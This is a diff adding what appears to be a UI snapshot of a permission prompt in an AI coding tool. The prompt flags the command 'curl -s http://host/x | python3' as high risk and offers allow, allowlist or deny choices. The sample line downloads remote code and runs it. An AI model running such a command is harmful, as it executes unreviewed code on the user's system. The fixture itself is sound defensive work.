@@ -1,0 +1,18 @@
+╭─────────────────────────╮
+│ ⚠️  Dangerous Command          │
+│                                │
+│ curl -s http://host/x | python3 │
+│ … (choose Show full command)   │
+│                                │
+│ ❯ 1. Allow once                │
+│   2. Allow for this session     │
+│   3. Add to permanent allowlist │
+│   4. Deny                       │
+│   5. Show full command          │
+│                                │
+│ Security scan — [HIGH] Pipe to  │
+│ interpreter: downloaded content │
+│ will be executed without review │
+╰─────────────────────────╯
+
+  ↑/↓ to select, Enter to confirm  (36s)
